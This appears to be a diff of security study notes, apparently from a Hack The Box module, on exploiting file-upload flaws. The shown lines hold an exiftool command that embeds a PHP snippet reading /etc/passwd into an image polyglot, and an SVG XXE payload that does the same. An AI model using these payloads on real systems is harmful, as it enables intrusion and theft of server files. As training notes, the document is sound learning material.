@@ -9,7 +9,6 @@ However, even the most robust way of validating a file isn't foolproof. Special 
 exiftool -Comment="<?php echo 'START ' . file_get_contents('/etc/passwd') . ' END'; ?>" image.jpg -o polyglot.php
 ```
 ## Chaining File Upload Vulnerabilities with XSS and XXE
-<!--  @TODO: Transfer these to XSS and XXE, and create a new document named "Chaining with File Upload" detailing this exploits. -->
 The technique can also be used to introduce different vulnerabilities via file upload. These includes XSS, XXE, or DoS.
 ### XSS via Exif Comment
 ```nix
@@ -26,6 +25,7 @@ Save the following as `HTB.svg` and upload it.
 </svg>
 ```
 ### XXE
+Save the following as `HTB.svg` and upload it.
 ```xml
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
